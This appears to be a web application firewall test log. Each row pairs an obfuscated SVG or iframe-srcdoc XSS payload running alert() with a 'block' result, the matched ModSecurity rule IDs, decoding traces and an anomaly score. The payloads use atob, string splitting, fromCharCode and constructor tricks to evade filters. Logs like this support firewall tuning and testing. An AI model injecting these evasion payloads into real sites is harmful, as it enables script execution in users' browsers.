3668,<svg onload=globalThis['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,5,"933210,941100,941120,941160,949110","o22,36v216,59t:urlDecode,t:replaceComments,t:compressWhitespace || v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603727113.653293
3677,"<svg onload=setTimeout(function(){eval('al'+'\x65'+'rt(1)')},0)>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o31,7v217,64 || o34,29v217,64 || o23,11v217,64 || o23,11v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603728462.572614
3678,"<svg onload=setInterval(function(){eval(atob('YWxlcnQoMSk='))},1)>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o32,7v217,66 || o35,30v217,66 || o24,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603728681.107791
3680,"<svg onload=setTimeout(function(){[].constructor.constructor('al'+'ert(1)')()},0)>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o22,59v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,82 || o23,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603728867.945650
3681,"<svg onload=setTimeout(function(){Function('al'+'ert(1)')()},0)>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o22,41v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,64 || o23,11v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603729029.371660
3682,"<svg onload=setTimeout(function(){self['ev'+'al']('al'+'ert(1)')},0)>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o22,46v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,69 || o23,11v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,15v217,69t:urlDecodeUni,t:compressWhitespace || ",35,177603729175.513044
3684,"<svg onload=setTimeout(function(){eval('al'+'\u0065'+'rt(1)')},0)>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o31,7v217,66 || o34,31v217,66 || o23,11v217,66 || o23,11v217,66t:urlDecodeUni || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603729448.102670
3686,"<svg onload=setTimeout(function(){eval(String['fromCharCode'](97,108,101,114,116,40,49,41))},0)>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o31,7v217,96 || o34,61v217,96 || o22,73v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603729722.306202
3687,"<svg onload=setInterval(function(){top['eval']('al'+'ert(1)')},1)>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o32,6v217,66 || o23,42v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,66 || o24,11v217,66t:urlDecodeUni || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,11v217,66t:urlDecodeUni,t:compressWhitespace || ",40,177603729923.001030
3688,"<svg onload=setTimeout(function(){globalThis['eval']('al'+'ert(1)')},0)>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o22,49v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,72 || o23,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603730059.265310
3689,"<svg onload=setTimeout(function(){this['eval']('al'+String['fromCharCode'](101)+'rt(1)')},0)>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o22,70v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,93 || o23,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,12v217,93t:urlDecodeUni,t:compressWhitespace || ",35,177603730258.665548
3690,"<svg onload=setTimeout(function(){eval('al\u0065rt(1)')},0)>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o31,7v217,60 || o34,25v217,60 || o23,11v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603730330.575039
3692,"<svg onload=setTimeout(function(){[]['constructor']['constructor']('al'+'ert(1)')()},0)>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o22,65v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,88 || o23,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603730633.276794
3693,"<svg onload=setTimeout(function(){eval(`al${String.fromCharCode(101)}rt(1)`)},0)>",0,1,block,8,"932100,932130,933160,934100,941100,941120,941160,949110","o31,7v217,81 || o42,35v217,81t:urlDecodeUni,t:cmdLine || o34,46v217,81 || o23,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603730748.424625
3694,"<svg onload=setTimeout(function(){eval(['al','ert(1)'].join(''))},0)>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o31,7v217,69 || o34,34v217,69 || o23,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603730917.331090
3695,"<svg onload=setTimeout(function(){(eval)('al'+'ert(1)')},0)>",0,1,block,8,"932100,933210,934100,934100,941100,941120,941160,949110","o31,8v217,60 || o22,37v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o23,11v217,60 || o23,11v217,60t:urlDecodeUni || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17760373104.520718
3696,"<svg onload=setTimeout(function(){window[atob('ZXZhbA==')]('al'+'ert(1)')},0)>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o23,11v217,78 || o23,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,24v217,78t:urlDecodeUni,t:compressWhitespace || ",30,177603731150.130502
3698,"<svg><animate onbegin=""this.onbegin=null;Function('ale'+'rt(22)')()""></animate></svg>",0,1,block,4,"941100,941120,941160,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603731413.036688
3700,"<svg><animate onbegin=""this.onbegin=null;(new(Function.bind.apply(Function,[null,'ale'+'rt(22)'])))()""></animate></svg>",0,1,block,4,"941100,941120,941160,949110","v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603731799.893871
3708,"<svg><animate onbegin=""this.onbegin=null;Function.prototype.constructor('ale'+'rt(22)')()""></animate></svg>",0,1,block,4,"941100,941120,941160,949110","v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603732928.621476
3709,"<svg><animate onbegin=""this.onbegin=null;globalThis.Function('ale'+'rt(22)')()""></animate></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603733139.222297
3712,"<svg><animate onbegin=""this.onbegin=null;Reflect.construct(Function,['ale'+'rt(22)'])()""></animate></svg>",0,1,block,4,"941100,941120,941160,949110","v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603733513.255960
3716,"<svg><animate onbegin=""this.onbegin=null;parent.Function('ale'+'rt(22)')()""></animate></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603734147.253313
3717,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;(1,eval)(atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603734327.812951
3718,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;Function(atob('YWxlcnQoMSk='))()&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603734422.685978
3719,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;[].constructor.constructor(atob('YWxlcnQoMSk='))()&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603734660.947742
3720,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;setTimeout(atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603734715.132002
3721,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;setInterval(atob('YWxlcnQoMSk='),1)&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,183t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,183t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,183t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,183t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603734946.368334
3723,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;window['ev'+'al'](atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,7,"933210,941100,941110,941130,941160,941370,949110","o106,33v217,187t:urlDecode,t:replaceComments,t:compressWhitespace || v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o100,17v217,187t:urlDecodeUni,t:compressWhitespace || ",30,17760373523.697523
3724,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;this[String.fromCharCode(101,118,97,108)](atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,7,"934100,941100,941110,941130,941160,941370,949110","o105,19v217,211 || v217,211t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,211t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,211t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,211t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o100,41v217,211t:urlDecodeUni,t:compressWhitespace || ",30,177603735398.823341
3725,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;self['e\u0076al'](atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"941100,941110,941130,941160,941370,949110","v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o100,17v217,187t:urlDecodeUni,t:compressWhitespace || ",25,177603735597.913362
3731,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;eval	(atob	('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,8,"932100,933160,934100,941100,941110,941130,941160,949110","o99,5v217,176 || o100,28v217,176 || o100,6v217,176 || v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603736423.581264
3732,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;eval/**/(atob/**/('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,7,"932100,933160,941100,941110,941130,941160,949110","o99,5v217,182 || o100,34v217,182 || v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603736575.459840
3733,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;(0,eval)(atob`YWxlcnQoMSk=`)&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603736682.199990
3734,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;eval.call(null,atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"932100,941100,941110,941130,941160,949110","o99,5v217,184 || v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603736810.222831
3735,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;eval.apply(null,[atob('YWxlcnQoMSk=')])&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"932100,941100,941110,941130,941160,949110","o99,5v217,187 || v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,187t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603736968.080025
3736,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;top['e\x76\u0061l'](atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,7,"932105,941100,941110,941130,941160,941370,949110","o99,4v217,189 || v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o100,19v217,189t:urlDecodeUni,t:compressWhitespace || ",30,177603737172.081357
3737,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933160,934100,941100,941110,941130,941160,949110","o86,26v217,160 || o86,5v217,160 || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603737227.255237
3738,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&#60;script&#62;eval(atob(&#39;YWxlcnQoMSk=&#39;))&#60;/script&#62;""></iframe></div></foreignObject></svg>",0,1,block,8,"932100,933160,934100,941100,941110,941130,941160,949110","o93,5v217,184 || o94,34v217,184 || o94,5v217,184 || v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17760373747.153856
3739,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<ScRiPt>eval(atob('YWxlcnQoMSk='))</ScRiPt>""></iframe></div></foreignObject></svg>",0,1,block,7,"933160,934100,941100,941110,941130,941160,949110","o86,26v217,160 || o86,5v217,160 || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603737515.088437
